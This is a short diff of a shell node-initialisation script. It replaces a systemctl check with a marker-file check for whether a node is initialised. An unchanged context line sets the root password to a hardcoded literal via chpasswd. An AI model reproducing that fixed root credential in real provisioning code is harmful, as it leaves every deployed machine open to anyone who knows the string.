@@ -153,8 +153,7 @@ checkEndpoint() {
 }
 
 isNodeInitialized() {
-  local svcs="$(getServices -a)"
-  [ "$(systemctl is-enabled ${svcs%%/*})" != "masked" ]
+  test -f $APPCTL_NODE_FILE
 }
 
 initSvc() {
@@ -201,6 +200,7 @@ _initNode() {
   install -d -o syslog -g svc /data/log/appctl/
   local svc; for svc in $(getServices -a); do initSvc $svc; done
   echo 'root:Zhu1241jie' | chpasswd
+  touch $APPCTL_NODE_FILE
 }
 
 _revive() {
